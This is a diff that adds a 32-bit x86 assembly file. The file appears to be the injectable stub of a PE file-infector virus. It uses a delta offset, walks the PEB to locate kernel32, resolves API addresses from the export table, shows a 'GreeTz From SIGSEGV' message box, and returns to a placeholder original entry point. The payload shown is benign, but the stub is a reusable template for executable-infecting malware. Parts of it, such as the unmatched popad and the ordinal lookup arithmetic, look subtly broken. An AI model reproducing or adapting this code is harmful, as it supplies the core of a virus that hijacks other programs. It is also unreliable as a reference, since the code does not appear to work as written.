@@ -1,0 +1,137 @@
+﻿.586p
+.model FLAT, stdcall
+Extern VirtualProtect@16:NEAR
+_DATA segment
+temp dword ?
+_DATA ends
+_TEXT segment
+START :
+push offset temp
+push 40h
+mov eax, offset END_VR
+mov ebx, offset START_VR
+sub eax, ebx
+push eax
+mov eax, offset START_VR
+push eax
+call VirtualProtect@16
+
+START_VR :
+
+call CodeStart
+CodeStart :
+pop ebp
+sub ebp, CodeStart; delta offset shit
+assume fs : nothing
+mov ebx, fs: [30h]; get a pointer to the PEB
+mov ebx, [ebx + 0Ch]; get PEB->Ldr
+mov ebx, [ebx + 014h]; get PEB->Ldr.InMemoryOrderModuleList.Flink(1st entry)
+mov ebx, [ebx]
+mov ebx, [ebx]
+mov ebx, [ebx + 10h]; Get Kernel32 Base
+mov [ebp+dwKernelBase] , ebx
+add ebx, [ebx + 03Ch]; Start of PE header
+mov ebx, [ebx + 078h]; RVA of export dir
+add ebx, [ebp + dwKernelBase]; VA of export dir
+mov[ebp + dwExportDirectory], ebx
+
+lea edx, [ebp + api_GetProcAddress]
+mov ecx, [ebp + len_GetProcAddress]
+call GetFunctionAddress
+mov[ebp + AGetProcAddressA], eax
+lea edx, [ebp + api_LoadLibrary]
+push edx
+push dword ptr [ebp + dwKernelBase]
+call eax
+mov [ebp + ALoadLibraryA], eax
+lea edx, [ebp + szUser32]
+push edx
+call eax
+lea edx, [ebp + api_MessageBoxA]
+push edx
+push eax
+mov ebx, [ebp + AGetProcAddressA]
+call ebx
+mov[ebp + AMessageBoxAA], eax
+
+push 0
+lea edx, [ebp + szTitle]
+push edx
+lea edx, [ebp + szMsg]
+push edx
+push 0
+call eax
+popad
+
+push 0BBBBBBBBh; OEP
+retn
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+; << << < GetFunctionAddress >> >> >> ;
+;    Extracts Function Address From Export Directory and returns it in eax;
+;    Parameters:  Function name in edx, Length in ecx;
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+GetFunctionAddress:
+push ebx
+push esi
+push edi
+
+mov esi, [ebp + dwExportDirectory]
+mov esi, [esi + 020h]; RVA of ENT
+add esi, [ebp + dwKernelBase]; VA of ENT
+xor ebx, ebx
+cld
+
+looper :
+inc ebx
+lodsd
+add eax, [ebp + dwKernelBase]; eax now points to the string of a function
+push esi; preserve it for the outer loop
+mov esi, eax
+mov edi, edx
+cld
+push ecx
+repe cmpsb
+pop ecx
+pop esi
+jne looper
+
+dec ebx
+mov eax, [ebp + dwExportDirectory]
+mov eax, [eax + 024h]; RVA of EOT
+add eax, [ebp + dwKernelBase]; VA of EOT
+mov ecx, 2
+mul ecx
+mov ebx, ecx
+add ebx, eax
+movzx eax, bx
+mov ebx, [ebp + dwExportDirectory]
+mov ebx, [ebx + 01Ch]; RVA of EAT
+add ebx, [ebp + dwKernelBase]; VA of EAT
+mov ebx, [eax * 4 + ebx]
+add ebx, [ebp + dwKernelBase]
+mov eax, ebx
+
+pop edi
+pop esi
+pop ebx
+ret
+
+
+szTitle              db      "Yo !", 0
+	szMsg  db  "GreeTz From SIGSEGV", 0
+	szUser32            db    "User32.dll", 0
+	ALoadLibraryA  dword ?
+	AGetProcAddressA  dword ?
+	api_GetProcAddress  db    "GetProcAddress"
+	len_GetProcAddress  dd    $ - api_GetProcAddress
+	
+	api_LoadLibrary  db    "LoadLibraryA", 0
+	AMessageBoxAA  dword ?
+	api_MessageBoxA  db    "MessageBoxA", 0
+	dwKernelBase  dword ?
+	dwExportDirectory  dword ?
+END_VR :
+_TEXT ends
+END START
